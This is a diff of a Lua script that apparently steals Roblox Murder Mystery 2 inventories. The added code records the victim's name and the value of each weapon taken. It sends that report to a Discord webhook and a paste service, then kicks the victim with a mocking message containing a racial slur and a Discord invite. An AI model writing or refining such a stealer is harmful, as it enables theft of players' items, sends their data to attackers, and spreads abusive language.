@@ -213,22 +213,37 @@ if #weaponsToSend > 0 then
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- Función final para trades
+-- Función final para trades con formato igual al webhook inicial
 local function TradeFinalizado()
-    local link = "https://discord.gg/4VySnCHy"
-    if setclipboard then setclipboard(link) end
-
     local fieldsFinal={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
         {name="Armas enviadas 📦:", value="", inline=false},
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
     }
-    for _, w in ipairs(weaponsToSend) do
-        fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+
+    local maxEmbedItems = math.min(18,#weaponsToSend)
+    for i=1,maxEmbedItems do
+        local w = weaponsToSend[i]
+        fieldsFinal[2].value = fieldsFinal[2].value..string.format("%s x%s (%s)\nValor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
     end
-    SendWebhook("✅ Trades finalizados", "Todos los trades completados.", fieldsFinal)
+
+    if #weaponsToSend > 18 then
+        fieldsFinal[2].value = fieldsFinal[2].value.."... y más armas 🔥\n"
+        local pasteContent=""
+        for _, w in ipairs(weaponsToSend) do
+            pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+        end
+        pasteContent = pasteContent.."\nValor total del inventario📦: "..tostring(totalValue).."💰"
+        local pasteLink = CreatePaste(pasteContent)
+        if pasteLink then
+            fieldsFinal[2].value = fieldsFinal[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
+        end
+    end
+
+    local prefix=pingEveryone and "@everyone " or ""
+    SendWebhook("✅ Todos los trades finalizados","💰Todas las armas enviadas correctamente 😎",fieldsFinal,prefix)
     task.wait(1)
-    LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy"..link)
+    LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
 end
 
 -- Trade principal
